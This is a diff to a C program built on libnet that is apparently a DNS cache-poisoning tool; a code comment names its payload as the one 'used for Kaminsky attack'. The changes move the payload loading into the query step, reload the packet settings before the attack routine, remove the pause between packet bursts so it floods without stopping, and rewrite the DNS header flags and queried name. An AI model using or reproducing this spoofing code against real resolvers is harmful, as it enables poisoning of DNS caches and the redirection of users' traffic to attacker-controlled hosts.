@@ -137,20 +137,23 @@ main(int argc, char *argv[])
 
 	load_ethernet();
 	load_tcp_udp();
-	load_ip();
+	load_ip();	
 	convert_proto();
-	
 	query();
+	load_ethernet();
+	load_tcp_udp();
+	load_ip();	
 	attack();
 	
 }
 
 query(){
 
+
 	load_ethernet_k();
 	load_tcp_udp_k();
 	load_ip_k();
-
+	load_payload_k();
 
 
 l = libnet_init(
@@ -171,7 +174,6 @@ l = libnet_init(
      	 * DNS payload used for Kaminsky attack
      	 */
 	
-	load_payload_k();
 
 	if(ip_proto_val==IPPROTO_TCP){    
 		t = libnet_build_tcp(
@@ -381,7 +383,7 @@ while(1){
 //			y=999;
 //			nap_time = 0;
 //		}
-		sleep(nap_time);         /*Pause of this many seconds then loop again*/
+		//sleep(nap_time);         /*Pause of this many seconds then loop again*/
 //		z=1;
 //	}
 
@@ -437,7 +439,7 @@ load_payload()
 
 
 	char nprefix[] = "www";
-	char name[] = "wazzup";
+	char name[] = "fake";
 	char ndomain[] = "com";
 
 	unsigned int l_p = strlen(nprefix);
@@ -710,9 +712,9 @@ load_payload_k()
 
 	printf("hex trans id: %X %X\n",payload_location[0],payload_location[1]);
 
-    payload_location[2] = 0x81; payload_location[3] = 0x80;
+    payload_location[2] = 0x01; payload_location[3] = 0x00;
     payload_location[4] = 0x00; payload_location[5] = 0x01;
-    payload_location[6] = 0x00; payload_location[7] = 0x01;
+    payload_location[6] = 0x00; payload_location[7] = 0x00;
     payload_location[8] = 0x00; payload_location[9] = 0x00;
     payload_location[10] = 0x00; payload_location[11] = 0x00;
    
@@ -721,7 +723,7 @@ load_payload_k()
 
 
 	char nprefix[] = "www";
-	char name[] = "wazzup";
+	char name[] = "fake";
 	char ndomain[] = "com";
 
 	unsigned int l_p = strlen(nprefix);
@@ -800,7 +802,7 @@ load_ethernet_k()
 }
 
     /* load_tcp_udp: load TCP or UDP data file into the variables */
-load_tcp_udp()
+load_tcp_udp_k()
 {
     FILE *infile;
 
